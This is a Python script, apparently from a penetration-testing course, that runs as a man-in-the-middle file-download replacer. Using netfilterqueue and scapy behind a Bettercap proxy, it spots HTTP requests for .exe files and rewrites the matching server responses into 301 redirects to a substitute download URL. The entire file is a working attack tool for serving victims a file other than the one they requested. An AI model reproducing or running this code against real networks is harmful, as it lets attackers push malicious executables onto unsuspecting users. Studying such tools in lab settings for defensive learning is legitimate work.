#!/usr/bin/env python3
# Rebuild
import netfilterqueue
from scapy.layers.inet import IP, TCP
from scapy.layers.dns import Raw

extensions = [".exe",".url",".zip",".pdf",".json",".md",".yml"]
ack_list = []
replace_download = "https://www.rarlab.com/rar/winrar-x64-722.exe"

def set_load(packet, redirection):
    # Tell "moved permanently, 301" to our link
    # \n\n end clear us precaution
    packet[Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: " + redirection + "\n\n"
    # For scapy to recalculate IP and Chksum values
    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet= IP(packet.get_payload())
    if scapy_packet.haslayer(Raw):
        if scapy_packet.haslayer(TCP):
            # change port from HTTP port 80 to 8080
            # the port used by the Bettercap redirection proxy
            # AND ...  make sure our replace download DN is not in download
            if scapy_packet[TCP].dport == 8080 and b"www.rarlab.com" not in scapy_packet[Raw].load:
                print("[+] This is a HTTP Request:  ")
                print(scapy_packet.show())
                if b".exe" in scapy_packet[Raw].load:
                    print("[+] Exe Request, acknowledgement number:  ")
                    print(scapy_packet[TCP].ack)
                    ack_list.append(scapy_packet[TCP].ack)

            # change port from HTTP port 80 to 8080
            # the port used by the Bettercap redirection proxy
            elif scapy_packet[TCP].sport == 8080:
                print("[+] This is a HTTP Response: ")
                if scapy_packet[TCP].seq:
                    # print(scapy_packet.show())
                    print("[+] Here is our Sequence Number: ")
                    print(scapy_packet[TCP].seq)
                    if scapy_packet[TCP].seq in ack_list:
                        # print(scapy_packet.show())
                        # Clear ack_list for future use
                        ack_list.remove(scapy_packet[TCP].seq)
                        print("[+] Replacing File: ")
                        modified_packet = set_load(scapy_packet, replace_download)

                        # Modify the packet that will be sent to the target, without updated packet.
                        packet.set_payload(modified_packet.build())

    packet.accept()


if __name__ == "__main__":
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()


